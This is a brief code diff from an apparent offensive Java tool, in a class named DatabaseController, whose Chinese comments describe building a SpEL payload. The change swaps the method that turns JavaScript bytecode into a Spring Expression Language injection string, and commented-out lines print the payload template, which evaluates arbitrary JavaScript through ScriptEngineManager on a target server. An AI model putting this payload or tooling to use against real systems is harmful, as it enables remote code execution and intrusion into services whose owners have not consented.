@@ -118,7 +118,7 @@ public abstract class DatabaseController implements Controller {
 
         //SPEL-Payload制作
         String code = JSExpression.commonExpressModify((byte[])objects[1]);
-        String spelPayload = SpelExpression.expressModify(code);
+        String spelPayload = SpelExpression.spelJsCode(code);
         // Replace single quotes with two single quotes SPEL加载JS字节码必须要这样
 //        String modifiedCode = code.replace("'", "''");
 //        String spelPayload = "#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('"+ modifiedCode +"')}";
